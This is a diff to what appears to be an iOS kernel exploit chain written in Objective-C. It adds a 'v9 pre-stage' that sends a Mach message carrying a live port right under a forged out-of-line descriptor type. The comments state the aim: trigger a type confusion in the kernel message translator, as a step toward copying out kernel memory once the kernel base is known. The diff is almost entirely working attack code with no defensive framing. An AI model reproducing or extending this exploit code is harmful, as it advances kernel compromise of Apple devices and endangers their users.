@@ -49,7 +49,7 @@
 #import <netinet/in.h>
 #import <objc/message.h>
 
-#define P073_BUILD @"p073-second-table-v7j1-chain-hook"
+#define P073_BUILD @"p073-second-table-v8-ool-swap"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -954,6 +954,56 @@ static NSURL *p073_model_url(NSString *name) {
                 p073_log(@"[CHAIN] p073_chain_ready board event — %@", det);
             }
         }
+
+    /* ---- v9 pre-stage: the OOL/port swap probe (the CHAIN line's named act) ----
+       Self-contained, NO reader needed: one new msg whose single descriptor
+       carries a REAL live right's name but the forged wire-type of an OOL
+       descriptor (the wire shape is identical 12B — that IS the confusion).
+       Send-side verdict + one recv; honest early-outs. Sealed classes
+       respected: no fat type-3 OOL recv (PACGA-fatal, v45), no fabricated
+       names (they fail copyin — p113-v1 law). A REAL kernel-bytes copyout
+       needs a kernel address in the desc's address word = the
+       post-certificate rung (after kbase/typeinfo). */
+    {
+        p073_log(@"[*] v9 pre-stage: OOL/port swap probe (one forged send, one recv)");
+        mach_port_t probePort = p073_make_port();
+        if (!probePort) {
+            p073_log(@"[-] v9 probe port alloc fail");
+        } else {
+            mach_port_t liveSend = MACH_PORT_NULL;
+            for (uint32_t i2 = 0; i2 < nPre; i2++)
+                if (sentPre[i2].alive && sentPre[i2].port != MACH_PORT_NULL) { liveSend = sentPre[i2].port; break; }
+            if (!liveSend) {
+                p073_log(@"[-] v9: no live right available for the probe");
+            } else {
+                uint8_t sbuf[0x80]; memset(sbuf, 0, sizeof sbuf);
+                mach_msg_header_t *h2 = (mach_msg_header_t *)sbuf;
+                mach_msg_body_t *b2 = (mach_msg_body_t *)(sbuf + sizeof(mach_msg_header_t));
+                b2->msgh_descriptor_count = 1;
+                mach_msg_port_descriptor_t *d2 = (mach_msg_port_descriptor_t *)(sbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                d2->name = liveSend;
+                d2->disposition = MACH_MSG_TYPE_COPY_SEND;
+                d2->type = 1;   /* MACH_MSG_OOL_DESCRIPTOR — the forged word */
+                h2->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                h2->msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + 12);
+                h2->msgh_remote_port = probePort;
+                kern_return_t kr2 = mach_msg(h2, MACH_SEND_MSG, h2->msgh_size, 0,
+                                             MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+                p073_log(@"[*] forged-type send kr=%u (%s) — accepted = translator confused",
+                         kr2, mach_error_string(kr2));
+                uint8_t rbuf2[0x100]; memset(rbuf2, 0, sizeof rbuf2);
+                mach_msg_header_t *rh2 = (mach_msg_header_t *)rbuf2;
+                kr2 = mach_msg(rh2, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof rbuf2, probePort, 1000, MACH_PORT_NULL);
+                p073_log(@"[*] recv kr=%u size=%u", kr2, rh2->msgh_size);
+                if (kr2 == KERN_SUCCESS) {
+                    mach_msg_body_t *rb2 = (mach_msg_body_t *)(rbuf2 + sizeof(mach_msg_header_t));
+                    p073_log(@"[v9] RECV OK desc_count=%u — translation bar reached "
+                             @"(desc-class verdict = the harvest's portkind path)",
+                             rb2->msgh_descriptor_count);
+                }
+            }
+        }
+    }
     /* ---- verdict ---- */
     p073_log(@"=== VERDICT ===");
     if (touched > 0) {
